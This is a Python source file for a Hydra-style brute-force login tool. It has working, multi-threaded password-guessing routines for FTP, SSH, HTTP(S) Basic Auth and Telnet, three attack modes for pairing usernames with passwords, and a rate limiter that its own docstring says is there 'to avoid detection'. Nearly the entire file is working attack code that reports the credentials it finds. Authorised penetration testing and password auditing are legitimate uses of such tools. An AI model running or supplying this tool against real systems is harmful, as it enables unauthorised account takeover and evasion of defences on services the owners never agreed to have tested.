"""
Advanced Brute Force Attacker
Inspired by Hydra with multiple attack modes and rate limiting
"""
import ftplib
import json
import sys
from time import sleep, time
from threading import Thread, Lock, Event
from queue import Queue, Empty
from typing import List, Dict, Tuple, Optional, Callable
from dataclasses import dataclass
from enum import Enum

try:
    import paramiko
except ImportError:
    paramiko = None

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    requests = None


class AttackMode(Enum):
    """Attack modes inspired by Hydra"""
    SINGLE = "single"      # One password for each user
    LOOP = "loop"          # Try each password for each user
    COMBO = "combo"        # Paired user:password from file


@dataclass
class Credential:
    """Credential pair"""
    username: str
    password: str
    
    def __str__(self):
        return f"{self.username}:{self.password}"


class RateLimiter:
    """Rate limiting to avoid detection"""
    
    def __init__(self, delay: float = 0.1, burst_size: int = 10):
        self.delay = delay
        self.burst_size = burst_size
        self.lock = Lock()
        self.last_attempt = time()
        self.burst_count = 0
    
    def wait(self):
        """Enforce rate limit"""
        with self.lock:
            self.burst_count += 1
            
            if self.burst_count >= self.burst_size:
                elapsed = time() - self.last_attempt
                if elapsed < self.delay * self.burst_size:
                    sleep(self.delay * self.burst_size - elapsed)
                self.burst_count = 0
                self.last_attempt = time()
            else:
                sleep(self.delay)


class BruteForcer:
    """Advanced multi-threaded brute force attacker"""
    
    def __init__(self, host: str, port: Optional[int] = None, 
                 protocol: str = "ftp", timeout: float = 5.0,
                 verbose: bool = False):
        self.host = host
        self.port = port
        self.protocol = protocol.lower()
        self.timeout = timeout
        self.verbose = verbose
        
        self._set_default_port()
        
        self.found_credentials = []
        self.attempts = 0
        self.failures = 0
        self.lock = Lock()
        self.rate_limiter = RateLimiter()
        self.start_time = None
        self.stop_event = Event()
    
    def _set_default_port(self):
        """Set default port based on protocol"""
        if self.port is None:
            defaults = {
                "ftp": 21,
                "ssh": 22,
                "http": 80,
                "https": 443,
                "telnet": 23,
                "smtp": 25,
                "pop3": 110,
                "imap": 143,
                "mysql": 3306,
                "postgres": 5432,
                "mongodb": 27017,
            }
            self.port = defaults.get(self.protocol, 21)
    
    def _attempt_ftp(self, username: str, password: str) -> bool:
        """Attempt FTP login"""
        try:
            with ftplib.FTP(self.host, timeout=self.timeout) as ftp:
                ftp.login(user=username, passwd=password)
                return True
        except ftplib.error_perm:
            return False
        except Exception as e:
            if self.verbose:
                print(f"⚠️  FTP error: {str(e)[:50]}")
            return None
    
    def _attempt_ssh(self, username: str, password: str) -> bool:
        """Attempt SSH login"""
        if not paramiko:
            print("❌ paramiko not installed. Install with: pip install paramiko")
            return None
        
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(
                hostname=self.host,
                port=self.port,
                username=username,
                password=password,
                timeout=self.timeout,
                allow_agent=False,
                look_for_keys=False,
                banner_timeout=self.timeout
            )
            ssh.close()
            return True
        except paramiko.AuthenticationException:
            return False
        except Exception as e:
            if self.verbose:
                print(f"⚠️  SSH error: {str(e)[:50]}")
            return None
    
    def _attempt_http(self, username: str, password: str, https: bool = False) -> bool:
        """Attempt HTTP Basic Auth"""
        if not requests:
            print("❌ requests not installed. Install with: pip install requests")
            return None
        
        try:
            proto = "https" if https else "http"
            url = f"{proto}://{self.host}:{self.port}/"
            response = requests.get(
                url,
                auth=(username, password),
                timeout=self.timeout,
                verify=False
            )
            return response.status_code < 401
        except Exception as e:
            if self.verbose:
                print(f"⚠️  HTTP error: {str(e)[:50]}")
            return None
    
    def _attempt_telnet(self, username: str, password: str) -> bool:
        """Attempt Telnet login"""
        try:
            import telnetlib
            tn = telnetlib.Telnet(self.host, self.port, timeout=self.timeout)
            
            tn.read_until(b"login:", timeout=2)
            tn.write(username.encode() + b"\n")
            
            tn.read_until(b"Password:", timeout=2)
            tn.write(password.encode() + b"\n")
            
            response = tn.read_very_eager().decode(errors='ignore')
            tn.close()
            
            return "incorrect" not in response.lower() and "denied" not in response.lower()
        except Exception:
            return None
    
    def attempt_login(self, username: str, password: str) -> Optional[bool]:
        """Attempt login using specified protocol"""
        if self.protocol == "ftp":
            return self._attempt_ftp(username, password)
        elif self.protocol == "ssh":
            return self._attempt_ssh(username, password)
        elif self.protocol == "http":
            return self._attempt_http(username, password, https=False)
        elif self.protocol == "https":
            return self._attempt_http(username, password, https=True)
        elif self.protocol == "telnet":
            return self._attempt_telnet(username, password)
        
        return None
    
    def worker(self, queue: Queue):
        """Worker thread for attack"""
        while not self.stop_event.is_set():
            try:
                credential = queue.get(timeout=1)
            except Empty:
                break
            
            if credential is None:
                break
            
            # Apply rate limiting
            self.rate_limiter.wait()
            
            result = self.attempt_login(credential.username, credential.password)
            
            with self.lock:
                self.attempts += 1
                
                if result is True:
                    self.found_credentials.append(credential)
                    print(f"\n🟢 ✓ SUCCESS! {credential}")
                    
                    # Optionally stop on first success
                    if hasattr(self, 'stop_on_success') and self.stop_on_success:
                        self.stop_event.set()
                
                elif result is False:
                    self.failures += 1
                    if self.verbose:
                        print(f"  ✗ {credential} - Failed")
            
            queue.task_done()
    
    def attack(self, usernames: List[str], passwords: List[str], 
               num_threads: int = 10, attack_mode: AttackMode = AttackMode.LOOP,
               stop_on_success: bool = False) -> List[Credential]:
        """Execute brute force attack"""
        self.stop_on_success = stop_on_success
        
        # Generate credential pairs based on attack mode
        credentials = self._generate_credentials(usernames, passwords, attack_mode)
        
        if not credentials:
            print("❌ No credentials to test")
            return []
        
        print(f"\n🔓 {self.protocol.upper()} Brute Force Attack")
        print(f"   Target: {self.host}:{self.port}")
        print(f"   Usernames: {len(usernames)}")
        print(f"   Passwords: {len(passwords)}")
        print(f"   Attack mode: {attack_mode.value}")
        print(f"   Total attempts: {len(credentials)}")
        print(f"   Threads: {num_threads}")
        print("-" * 60)
        
        self.start_time = time()
        queue = Queue()
        threads = []
        
        # Create workers
        for _ in range(min(num_threads, len(credentials))):
            t = Thread(target=self.worker, args=(queue,), daemon=True)
            t.start()
            threads.append(t)
        
        # Queue credentials
        for cred in credentials:
            queue.put(cred)
        
        queue.join()
        
        # Stop workers
        self.stop_event.set()
        for _ in range(num_threads):
            queue.put(None)
        for t in threads:
            t.join()
        
        elapsed = time() - self.start_time
        print("-" * 60)
        
        # Print summary
        print(f"\n📊 Attack Summary:")
        print(f"   Attempts: {self.attempts}")
        print(f"   Successes: {len(self.found_credentials)}")
        print(f"   Failures: {self.failures}")
        print(f"   Time: {elapsed:.2f}s")
        if elapsed > 0:
            print(f"   Rate: {self.attempts/elapsed:.1f} attempts/sec")
        
        if self.found_credentials:
            print(f"\n✅ Credentials found:")
            for cred in self.found_credentials:
                print(f"   {cred}")
        else:
            print(f"\n❌ No valid credentials found")
        
        return self.found_credentials
    
    def _generate_credentials(self, usernames: List[str], passwords: List[str],
                             attack_mode: AttackMode) -> List[Credential]:
        """Generate credential pairs based on attack mode"""
        credentials = []
        
        if attack_mode == AttackMode.SINGLE:
            # One password per user
            for i, user in enumerate(usernames):
                if i < len(passwords):
                    credentials.append(Credential(user, passwords[i]))
        
        elif attack_mode == AttackMode.LOOP:
            # Try all passwords for each user
            for user in usernames:
                for passwd in passwords:
                    credentials.append(Credential(user, passwd))
        
        elif attack_mode == AttackMode.COMBO:
            # Paired user:password from combined list
            for user, passwd in zip(usernames, passwords):
                credentials.append(Credential(user, passwd))
        
        return credentials


def attack(host: str, usernames: List[str], passwords: List[str],
          protocol: str = "ftp", port: Optional[int] = None,
          num_threads: int = 10, timeout: float = 5.0,
          attack_mode: str = "loop", stop_on_success: bool = False,
          verbose: bool = False) -> List[Credential]:
    """Convenience function for brute force attack"""
    forcer = BruteForcer(host, port, protocol, timeout, verbose)
    
    try:
        mode = AttackMode[attack_mode.upper()]
    except KeyError:
        print(f"❌ Invalid attack mode: {attack_mode}. Use: single, loop, combo")
        return []
    
    return forcer.attack(usernames, passwords, num_threads, mode, stop_on_success)
